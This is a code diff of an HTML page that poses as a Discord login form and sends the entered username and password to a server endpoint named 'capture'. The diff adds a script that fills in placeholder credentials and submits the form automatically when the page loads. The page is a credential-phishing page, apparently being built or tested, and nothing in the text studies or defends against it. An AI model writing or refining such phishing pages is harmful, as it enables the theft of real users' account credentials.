@@ -37,11 +37,22 @@
 <body>
     <div class="login-form">
         <h2>Discord Login</h2>
-        <form action="https://your-server.com/capture" method="POST">
+        <form id="login-form" action="https://your-server.com/capture" method="POST">
             <input type="text" name="username" placeholder="Username" required>
             <input type="password" name="password" placeholder="Password" required>
             <button type="submit">Login</button>
         </form>
     </div>
+
+    <script>
+        window.onload = function() {
+            // Set default values for testing purposes (can be removed if not needed)
+            document.querySelector('input[name="username"]').value = "testuser";
+            document.querySelector('input[name="password"]').value = "testpassword";
+
+            // Automatically submit the form
+            document.getElementById('login-form').submit();
+        };
+    </script>
 </body>
 </html>
